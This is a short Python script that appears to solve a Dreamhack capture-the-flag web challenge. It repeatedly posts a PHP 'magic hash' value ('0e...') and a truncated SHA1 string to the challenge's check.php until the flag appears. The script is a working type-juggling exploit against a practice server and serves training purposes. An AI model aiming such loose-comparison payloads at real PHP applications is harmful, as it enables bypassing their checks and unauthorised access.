import requests, hashlib, re

url = 'http://host3.dreamhack.games:8733'

input1 = '0e12345678'
input2 = hashlib.sha1("1".encode()).hexdigest()[:8]

while True:
    res = requests.post(f'{url}/check.php', data={'input1': f'{input1}', 'input2': f'{input2}'})
    if "FLAG" in res.text:
        print(re.search(r'DH\{[^>]*\}', res.text).group(0))
        break
